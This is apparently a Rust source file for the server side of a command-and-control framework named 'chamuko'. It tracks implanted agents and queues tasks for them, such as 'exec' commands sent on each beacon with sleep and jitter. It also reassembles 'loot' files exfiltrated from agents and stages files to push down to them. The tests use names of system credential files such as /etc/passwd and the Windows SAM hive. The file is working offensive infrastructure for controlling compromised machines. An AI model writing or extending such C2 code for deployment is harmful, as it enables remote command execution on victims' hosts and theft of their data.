use std::collections::HashMap;
use std::path::{Path, PathBuf};

use chamuko_protocol::{AgentInfo, Chunk, Task, TaskResult, TaskStatus, Timestamp};

#[derive(Debug, Clone)]
pub struct ConsoleLine {
    pub ts: Timestamp,
    pub text: String,
}

/// A task plus its lifecycle. The C2 keeps the task after the agent answers so
/// the operator can review output instead of it scrolling past.
#[derive(Debug, Clone)]
pub struct TaskEntry {
    pub task: Task,
    pub status: TaskStatus,
    pub created: Timestamp,
    pub sent: Option<Timestamp>,
    pub finished: Option<Timestamp>,
    pub output: String,
    pub error: Option<String>,
    pub exit_code: Option<i32>,
    pub duration_ms: Option<u64>,
}

impl TaskEntry {
    fn new(task: Task) -> Self {
        Self {
            task,
            status: TaskStatus::Queued,
            created: chamuko_protocol::now_secs(),
            sent: None,
            finished: None,
            output: String::new(),
            error: None,
            exit_code: None,
            duration_ms: None,
        }
    }

    /// One-line rendering for the task panel.
    pub fn summary(&self) -> String {
        let args = if self.task.args.is_empty() {
            String::new()
        } else {
            format!(" {}", self.task.args.join(" "))
        };
        format!(
            "{} {}{} [{}]",
            self.task.id,
            self.task.command,
            args,
            self.status.as_str()
        )
    }
}

/// A file received from an agent, already reassembled and hashed.
#[derive(Debug, Clone)]
pub struct LootEntry {
    pub name: String,
    pub path: PathBuf,
    pub size: usize,
    pub sha256: String,
    pub agent_id: String,
    pub received: Timestamp,
}

#[derive(Debug, Clone)]
pub struct AgentEntry {
    pub info: AgentInfo,
    pub protocol: u32,
    pub last_seen: Timestamp,
    pub sleep: u64,
    pub jitter: u64,
    pub tasks: Vec<TaskEntry>,
    pub console: Vec<ConsoleLine>,
}

impl AgentEntry {
    pub fn new(info: AgentInfo, protocol: u32, sleep: u64, jitter: u64) -> Self {
        let mut console = Vec::new();
        console.push(ConsoleLine {
            ts: chamuko_protocol::now_secs(),
            text: format!(
                "agent registered: {}@{} ({}/{}) protocol v{}",
                info.username, info.hostname, info.os, info.arch, protocol
            ),
        });
        Self {
            info,
            protocol,
            last_seen: chamuko_protocol::now_secs(),
            sleep,
            jitter,
            tasks: Vec::new(),
            console,
        }
    }

    pub fn push_console(&mut self, text: impl Into<String>) {
        self.console.push(ConsoleLine {
            ts: chamuko_protocol::now_secs(),
            text: text.into(),
        });
    }

    pub fn pending_count(&self) -> usize {
        self.tasks
            .iter()
            .filter(|t| t.status == TaskStatus::Queued)
            .count()
    }

    #[cfg(test)]
    pub fn task(&self, task_id: &str) -> Option<&TaskEntry> {
        self.tasks.iter().find(|t| t.task.id == task_id)
    }

    /// Most recent task that already has an answer, for the footer summary.
    pub fn last_finished(&self) -> Option<&TaskEntry> {
        self.tasks
            .iter()
            .rev()
            .find(|t| t.finished.is_some())
    }
}

pub struct State {
    agents: HashMap<String, AgentEntry>,
    loot: Vec<LootEntry>,
    loot_dir: PathBuf,
    next_agent_id: u64,
    next_task_id: u64,
    /// In-flight agent -> C2 uploads, keyed by transfer id.
    incoming: HashMap<String, Incoming>,
    /// Files staged for C2 -> agent download, keyed by transfer id.
    outgoing: HashMap<String, Outgoing>,
}

/// An upload being reassembled from chunks.
#[derive(Debug)]
pub struct Incoming {
    pub agent_id: String,
    pub name: String,
    pub total: u32,
    chunks: HashMap<u32, Vec<u8>>,
}

impl Incoming {
    pub fn received(&self) -> u32 {
        self.chunks.len() as u32
    }
}

/// A file staged by the operator, served to the agent chunk by chunk.
#[derive(Debug)]
pub struct Outgoing {
    pub name: String,
    pub data: Vec<u8>,
    pub sha256: String,
}

impl Default for State {
    fn default() -> Self {
        Self::new()
    }
}

impl State {
    pub fn new() -> Self {
        Self::with_loot_dir("loot")
    }

    pub fn with_loot_dir(dir: impl Into<PathBuf>) -> Self {
        Self {
            agents: HashMap::new(),
            loot: Vec::new(),
            loot_dir: dir.into(),
            next_agent_id: 0,
            next_task_id: 0,
            incoming: HashMap::new(),
            outgoing: HashMap::new(),
        }
    }

    pub fn register_agent(
        &mut self,
        mut info: AgentInfo,
        protocol: u32,
        sleep: u64,
        jitter: u64,
    ) -> String {
        self.next_agent_id += 1;
        let id = format!("chamuko-{:04}", self.next_agent_id);
        info.id = id.clone();
        self.agents
            .insert(id.clone(), AgentEntry::new(info, protocol, sleep, jitter));
        id
    }

    pub fn get(&self, id: &str) -> Option<&AgentEntry> {
        self.agents.get(id)
    }

    pub fn get_mut(&mut self, id: &str) -> Option<&mut AgentEntry> {
        self.agents.get_mut(id)
    }

    pub fn agent_ids(&self) -> Vec<String> {
        let mut ids: Vec<String> = self.agents.keys().cloned().collect();
        ids.sort();
        ids
    }

    pub fn enqueue_task(
        &mut self,
        agent_id: &str,
        command: String,
        args: Vec<String>,
    ) -> Option<String> {
        let entry = self.agents.get_mut(agent_id)?;
        self.next_task_id += 1;
        let task_id = format!("task-{:06}", self.next_task_id);
        let task = Task {
            id: task_id.clone(),
            command,
            args,
        };
        entry.push_console(format!(">>> {} {}", task.command, task.args.join(" ")));
        entry.tasks.push(TaskEntry::new(task));
        Some(task_id)
    }

    /// Hands queued tasks to a beaconing agent and marks them sent.
    pub fn drain_tasks(&mut self, agent_id: &str) -> Option<(Vec<Task>, u64, u64)> {
        let entry = self.agents.get_mut(agent_id)?;
        let now = chamuko_protocol::now_secs();
        entry.last_seen = now;
        let mut tasks = Vec::new();
        for task in entry.tasks.iter_mut() {
            if task.status == TaskStatus::Queued {
                task.status = TaskStatus::Sent;
                task.sent = Some(now);
                tasks.push(task.task.clone());
            }
        }
        Some((tasks, entry.sleep, entry.jitter))
    }

    pub fn store_results(&mut self, agent_id: &str, results: Vec<TaskResult>) -> Option<()> {
        let entry = self.agents.get_mut(agent_id)?;
        entry.last_seen = chamuko_protocol::now_secs();
        for result in results {
            let now = chamuko_protocol::now_secs();
            let status = result.status();
            if let Some(task) = entry
                .tasks
                .iter_mut()
                .find(|t| t.task.id == result.task_id)
            {
                task.status = status;
                task.finished = Some(now);
                task.output = result.output.clone();
                task.error = result.error.clone();
                task.exit_code = result.exit_code;
                task.duration_ms = result.duration_ms;
            }
            match &result.error {
                Some(err) => entry.push_console(format!("err [{}]: {}", result.task_id, err)),
                None => entry.push_console(format!("out [{}]:\n{}", result.task_id, result.output)),
            }
        }
        Some(())
    }

    /// Writes a completed download to the loot directory and records it.
    pub fn store_loot(
        &mut self,
        agent_id: &str,
        name: String,
        data: &[u8],
    ) -> Result<LootEntry, String> {
        if !self.agents.contains_key(agent_id) {
            return Err(format!("unknown agent {agent_id}"));
        }
        let safe = sanitize_name(&name);
        std::fs::create_dir_all(&self.loot_dir)
            .map_err(|e| format!("cannot create loot dir: {e}"))?;

        let path = unique_path(&self.loot_dir, &safe);
        std::fs::write(&path, data).map_err(|e| format!("cannot write loot: {e}"))?;

        let entry = LootEntry {
            name: safe,
            path: path.clone(),
            size: data.len(),
            sha256: chamuko_protocol::sha256_hex(data),
            agent_id: agent_id.to_string(),
            received: chamuko_protocol::now_secs(),
        };
        self.loot.push(entry.clone());

        if let Some(agent) = self.agents.get_mut(agent_id) {
            agent.push_console(format!(
                "[loot] {} ({} bytes) sha256={}",
                entry.name,
                entry.size,
                &entry.sha256[..16]
            ));
        }
        Ok(entry)
    }

    /// Records one chunk of an incoming upload. Returns `(received, total)` and,
    /// when the last chunk arrives, the reassembled file written to loot.
    pub fn accept_upload(
        &mut self,
        agent_id: &str,
        name: &str,
        chunk: Chunk,
    ) -> Result<(u32, u32, Option<LootEntry>), String> {
        if !self.agents.contains_key(agent_id) {
            return Err(format!("unknown agent {agent_id}"));
        }
        let transfer = chunk.transfer.clone();
        let total = chunk.total;

        let entry = self.incoming.entry(transfer.clone()).or_insert_with(|| Incoming {
            agent_id: agent_id.to_string(),
            name: name.to_string(),
            total,
            chunks: HashMap::new(),
        });

        if entry.total != total {
            return Err(format!(
                "transfer {transfer}: chunk count changed from {} to {total}",
                entry.total
            ));
        }
        if entry.agent_id != agent_id {
            return Err(format!(
                "transfer {transfer}: belongs to {}, not {agent_id}",
                entry.agent_id
            ));
        }

        let bytes = chunk
            .bytes()
            .map_err(|e| format!("transfer {transfer} chunk {}: {e}", chunk.index))?;
        entry.chunks.insert(chunk.index, bytes);
        let received = entry.received();

        if received < total {
            return Ok((received, total, None));
        }

        let done = self
            .incoming
            .remove(&transfer)
            .ok_or("transfer vanished while completing")?;
        let mut ordered = Vec::with_capacity(done.total as usize);
        for index in 0..done.total {
            let part = done
                .chunks
                .get(&index)
                .ok_or_else(|| format!("transfer {transfer}: chunk {index} missing"))?;
            ordered.extend_from_slice(part);
        }

        let loot = self.store_loot(agent_id, done.name.clone(), &ordered)?;
        Ok((total, total, Some(loot)))
    }

    /// Stages a file for the agent to pull. Returns the transfer id.
    pub fn stage_download(&mut self, name: &str, data: Vec<u8>) -> String {
        let transfer = format!(
            "dl-{}",
            &chamuko_protocol::sha256_hex(name.as_bytes())[..12]
        );
        let transfer = if self.outgoing.contains_key(&transfer) {
            format!("{transfer}-{}", self.outgoing.len())
        } else {
            transfer
        };
        self.outgoing.insert(
            transfer.clone(),
            Outgoing {
                name: name.to_string(),
                sha256: chamuko_protocol::sha256_hex(&data),
                data,
            },
        );
        transfer
    }

    /// Serves one chunk of a staged download.
    pub fn serve_download(&self, transfer: &str, index: u32) -> Option<(Chunk, String)> {
        let entry = self.outgoing.get(transfer)?;
        let total = entry.data.len().div_ceil(chamuko_protocol::CHUNK_BYTES).max(1) as u32;
        if index >= total {
            return None;
        }
        let start = index as usize * chamuko_protocol::CHUNK_BYTES;
        let end = (start + chamuko_protocol::CHUNK_BYTES).min(entry.data.len());
        let slice = if start <= entry.data.len() {
            &entry.data[start..end]
        } else {
            &[]
        };
        Some((
            Chunk::new(transfer, index, total, slice),
            entry.sha256.clone(),
        ))
    }

    pub fn staged(&self) -> Vec<(&str, &str, usize)> {
        self.outgoing
            .iter()
            .map(|(id, o)| (id.as_str(), o.name.as_str(), o.data.len()))
            .collect()
    }

    pub fn loot(&self) -> &[LootEntry] {
        &self.loot
    }
}

/// Strips directory components and traversal so an agent cannot choose where
/// the file lands on the operator's disk.
fn sanitize_name(name: &str) -> String {
    let base = name
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(name)
        .trim()
        .to_string();
    let cleaned: String = base
        .chars()
        .map(|c| if c.is_control() { '_' } else { c })
        .collect();
    let cleaned = cleaned.replace("..", "_");
    if cleaned.is_empty() || cleaned.chars().all(|c| c == '_' || c == '.') {
        "unnamed".to_string()
    } else {
        cleaned
    }
}

/// Avoids clobbering an earlier download of the same filename.
fn unique_path(dir: &Path, name: &str) -> PathBuf {
    let candidate = dir.join(name);
    if !candidate.exists() {
        return candidate;
    }
    let (stem, ext) = match name.rsplit_once('.') {
        Some((stem, ext)) => (stem.to_string(), format!(".{ext}")),
        None => (name.to_string(), String::new()),
    };
    for n in 1..1000 {
        let path = dir.join(format!("{stem}-{n}{ext}"));
        if !path.exists() {
            return path;
        }
    }
    dir.join(format!("{stem}-{}", chamuko_protocol::now_secs()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use chamuko_protocol::{AgentInfo, Task};

    fn info(name: &str) -> AgentInfo {
        AgentInfo {
            id: String::new(),
            name: name.to_string(),
            hostname: "host".to_string(),
            username: "user".to_string(),
            os: "linux".to_string(),
            arch: "x86_64".to_string(),
            pid: 1,
            ip: String::new(),
        }
    }

    fn tmpdir(tag: &str) -> PathBuf {
        let dir =
            std::env::temp_dir().join(format!("chamuko-state-{tag}-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn assigns_sequential_agent_ids() {
        let mut state = State::new();
        assert_eq!(state.register_agent(info("a"), 2, 5, 2), "chamuko-0001");
        assert_eq!(state.register_agent(info("b"), 2, 5, 2), "chamuko-0002");
        assert_eq!(state.agent_ids(), vec!["chamuko-0001", "chamuko-0002"]);
    }

    #[test]
    fn enqueue_and_drain_round_trip_reports_beacon_interval() {
        let mut state = State::new();
        let id = state.register_agent(info("a"), 2, 7, 3);

        let task_id = state
            .enqueue_task(&id, "exec".to_string(), vec!["id".to_string()])
            .expect("task queued");
        assert_eq!(task_id, "task-000001");

        let (tasks, sleep, jitter) = state.drain_tasks(&id).expect("known agent");
        assert_eq!(sleep, 7);
        assert_eq!(jitter, 3);
        assert_eq!(
            tasks,
            vec![Task {
                id: "task-000001".to_string(),
                command: "exec".to_string(),
                args: vec!["id".to_string()],
            }]
        );

        let (empty, _, _) = state.drain_tasks(&id).expect("known agent");
        assert!(empty.is_empty());
    }

    #[test]
    fn draining_marks_tasks_sent_and_does_not_resend() {
        let mut state = State::new();
        let id = state.register_agent(info("a"), 2, 5, 2);
        state.enqueue_task(&id, "info".to_string(), Vec::new());

        let (first, _, _) = state.drain_tasks(&id).unwrap();
        assert_eq!(first.len(), 1);
        let entry = state.get(&id).unwrap();
        assert_eq!(entry.tasks[0].status, TaskStatus::Sent);
        assert!(entry.tasks[0].sent.is_some());

        let (second, _, _) = state.drain_tasks(&id).unwrap();
        assert!(second.is_empty());
    }

    #[test]
    fn results_move_task_to_terminal_state_and_keep_output() {
        let mut state = State::new();
        let id = state.register_agent(info("a"), 2, 5, 2);
        let task_id = state
            .enqueue_task(&id, "exec".to_string(), Vec::new())
            .unwrap();
        state.drain_tasks(&id);

        state.store_results(
            &id,
            vec![TaskResult {
                task_id: task_id.clone(),
                output: "ok".to_string(),
                error: None,
                exit_code: Some(0),
                duration_ms: Some(42),
            }],
        );

        let entry = state.get(&id).unwrap();
        let task = entry.task(&task_id).unwrap();
        assert_eq!(task.status, TaskStatus::Completed);
        assert_eq!(task.output, "ok");
        assert_eq!(task.duration_ms, Some(42));
        assert!(task.finished.is_some());
        assert!(entry.console.iter().any(|l| l.text.contains("ok")));
    }

    #[test]
    fn failed_result_is_recorded_as_failed() {
        let mut state = State::new();
        let id = state.register_agent(info("a"), 2, 5, 2);
        let task_id = state
            .enqueue_task(&id, "nope".to_string(), Vec::new())
            .unwrap();
        state.store_results(
            &id,
            vec![TaskResult {
                task_id: task_id.clone(),
                output: String::new(),
                error: Some("unknown command".to_string()),
                exit_code: None,
                duration_ms: None,
            }],
        );
        let entry = state.get(&id).unwrap();
        assert_eq!(entry.task(&task_id).unwrap().status, TaskStatus::Failed);
    }

    #[test]
    fn unknown_agents_are_rejected() {
        let mut state = State::new();
        assert!(state.drain_tasks("ghost").is_none());
        assert!(state.store_results("ghost", Vec::new()).is_none());
        assert!(
            state
                .enqueue_task("ghost", "exec".to_string(), Vec::new())
                .is_none()
        );
    }

    #[test]
    fn loot_is_written_and_hashed() {
        let dir = tmpdir("loot");
        let mut state = State::with_loot_dir(&dir);
        let id = state.register_agent(info("a"), 2, 5, 2);

        let entry = state
            .store_loot(&id, "secrets.txt".to_string(), b"hello")
            .unwrap();
        assert_eq!(entry.size, 5);
        assert_eq!(entry.sha256, chamuko_protocol::sha256_hex(b"hello"));
        assert_eq!(std::fs::read(&entry.path).unwrap(), b"hello");
        assert_eq!(state.loot().len(), 1);

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn loot_rejects_unknown_agent() {
        let dir = tmpdir("loot-ghost");
        let mut state = State::with_loot_dir(&dir);
        assert!(state.store_loot("ghost", "x".to_string(), b"y").is_err());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn loot_names_cannot_escape_the_loot_directory() {
        assert_eq!(sanitize_name("../../etc/passwd"), "passwd");
        assert_eq!(sanitize_name(r"C:\Windows\System32\config\SAM"), "SAM");
        assert_eq!(sanitize_name(".."), "unnamed");
        assert_eq!(sanitize_name("   "), "unnamed");
    }

    #[test]
    fn duplicate_loot_names_get_a_suffix() {
        let dir = tmpdir("loot-dup");
        let mut state = State::with_loot_dir(&dir);
        let id = state.register_agent(info("a"), 2, 5, 2);

        let first = state.store_loot(&id, "a.txt".to_string(), b"1").unwrap();
        let second = state.store_loot(&id, "a.txt".to_string(), b"2").unwrap();
        assert_ne!(first.path, second.path);
        assert!(second.path.to_string_lossy().contains("a-1.txt"));

        std::fs::remove_dir_all(&dir).ok();
    }
}
